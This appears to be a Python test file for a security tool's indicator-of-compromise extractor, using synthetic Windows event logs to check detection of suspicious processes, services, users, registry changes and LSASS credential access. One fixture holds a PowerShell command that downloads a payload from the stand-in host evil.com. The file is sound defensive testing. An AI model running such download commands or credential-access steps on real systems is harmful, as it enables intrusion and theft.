from __future__ import annotations

from app.correlation.ioc_extraction import extract_incident_iocs

EMPTY_FIELDS = {
    "Hostname": None, "SubjectUserName": None, "SourceIp": None, "DestinationIp": None,
    "ProcessGuid": None, "ParentProcessGuid": None, "ProcessId": None, "ParentProcessId": None,
    "LogonId": None, "SessionId": None, "ServiceName": None, "FilePath": None,
}


def _item(index: int, raw_log: str = "", event_id: str | None = None, **fields) -> dict:
    return {
        "index": index,
        "source_row": {"EventID": event_id} if event_id else {},
        "correlation_fields": {**EMPTY_FIELDS, **fields},
        "raw_log": raw_log,
    }


def test_process_creation_event_flagged_as_suspicious_process():
    item = _item(0, raw_log="EventID=4688 NewProcessName=cmd.exe", event_id="4688")
    result = extract_incident_iocs([item], [0])
    assert len(result["suspicious_processes"]) == 1
    assert result["suspicious_processes"][0]["process_name"] == "cmd.exe"
    assert {"type": "process", "value": "cmd.exe"} in result["ioc_list"]


def test_download_command_flagged():
    item = _item(1, raw_log='CommandLine="powershell.exe Invoke-WebRequest -Uri http://evil.com/payload.exe"')
    result = extract_incident_iocs([item], [1])
    assert len(result["downloaded_files"]) == 1


def test_service_install_event_flagged():
    item = _item(2, raw_log="EventID=7045", event_id="7045", ServiceName="EvilSvc")
    result = extract_incident_iocs([item], [2])
    assert len(result["created_services"]) == 1
    assert {"type": "service", "value": "EvilSvc"} in result["ioc_list"]


def test_user_creation_event_flagged():
    item = _item(3, raw_log="EventID=4720 TargetUserName=hacker", event_id="4720")
    result = extract_incident_iocs([item], [3])
    assert len(result["created_users"]) == 1


def test_registry_event_flagged():
    item = _item(4, raw_log="EventID=13 TargetObject=HKLM\\Software\\Run\\Evil", event_id="13")
    result = extract_incident_iocs([item], [4])
    assert len(result["registry_changes"]) == 1


def test_lsass_target_image_flagged_as_credential_access():
    item = _item(5, raw_log="EventID=10 TargetImage=C:\\Windows\\System32\\lsass.exe", event_id="10")
    result = extract_incident_iocs([item], [5])
    assert len(result["credential_access"]) == 1


def test_ioc_list_deduplicates_repeated_ip_across_rows():
    item_a = _item(6, SourceIp="10.0.0.5")
    item_b = _item(7, SourceIp="10.0.0.5")
    result = extract_incident_iocs([item_a, item_b], [6, 7])
    ip_entries = [i for i in result["ioc_list"] if i["type"] == "ip" and i["value"] == "10.0.0.5"]
    assert len(ip_entries) == 1


def test_no_signals_produces_empty_categories():
    item = _item(8, raw_log="")
    result = extract_incident_iocs([item], [8])
    assert result["suspicious_processes"] == []
    assert result["downloaded_files"] == []
    assert result["credential_access"] == []
